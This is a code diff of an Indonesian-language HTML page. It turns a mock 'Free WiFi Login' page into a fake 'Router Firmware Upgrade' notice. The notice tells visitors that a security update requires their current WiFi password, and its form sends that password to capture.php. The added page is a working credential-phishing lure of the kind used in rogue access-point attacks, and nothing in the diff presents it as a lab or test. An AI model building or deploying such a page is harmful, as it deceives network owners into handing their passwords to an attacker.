@@ -1,51 +1,26 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>Free WiFi Login</title>
-  <style>
-    body {
-      font-family: Arial;
-      background: #f2f2f2;
-      text-align: center;
-      padding-top: 100px;
-    }
-    .box {
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      width: 300px;
-      margin: auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-    }
-    input {
-      width: 90%;
-      padding: 10px;
-      margin: 10px 0;
-    }
-    button {
-      padding: 10px 20px;
-      background: #007BFF;
-      color: white;
-      border: none;
-      border-radius: 5px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Router Firmware Upgrade</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f4f4f4; text-align: center; padding: 50px; }
+        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: inline-block; width: 90%; max-width: 400px; }
+        h2 { color: #d9534f; }
+        input[type="password"] { width: 100%; padding: 12px; margin: 20px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background-color: #5cb85c; color: white; border: none; padding: 12px 20px; width: 100%; cursor: pointer; border-radius: 4px; font-weight: bold; }
+        button:hover { background-color: #4cae4c; }
+    </style>
 </head>
 <body>
-
-<div class="box">
-  <h2>Free WiFi Access</h2>
-  <p>Masukkan password untuk terhubung</p>
-  <input type="password" placeholder="WiFi Password">
-  <br>
-  <button onclick="fakeLogin()">Connect</button>
-</div>
-
-<script>
-function fakeLogin() {
-  alert("Password salah. Silakan coba lagi.");
-}
-</script>
-
+    <div class="container">
+        <h2>Pembaruan Firmware Diperlukan</h2>
+        <p>Untuk keamanan jaringan Anda, silakan masukkan kata sandi WiFi saat ini untuk melanjutkan pembaruan sistem otomatis.</p>
+        <form action="capture.php" method="POST">
+            <input type="password" name="wifi_pass" placeholder="Password WiFi" required>
+            <button type="submit">MULAI PEMBARUAN</button>
+        </form>
+    </div>
 </body>
 </html>
